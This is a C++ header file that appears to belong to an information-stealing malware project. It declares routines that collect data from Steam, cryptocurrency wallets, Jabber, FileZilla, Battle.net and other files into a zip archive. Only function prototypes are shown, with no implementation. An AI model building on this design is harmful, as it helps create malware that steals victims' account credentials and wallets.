#pragma once
#include <Windows.h>
#include <Shlwapi.h>
#include "FileStealer.h"
#include "Zip.h"

void doSteam(HZIP hZip, DWORD* dwCount);
void doWallet(HZIP hZip, DWORD* dwCount);
void doJabber(HZIP hZip, DWORD* dwCount);
void doFilezilla(HZIP hZip, DWORD* dwCount);
void doSomeFiles(HZIP hZip, DWORD* dwCount);
void doBattleNet(HZIP hZip, DWORD* dwCount);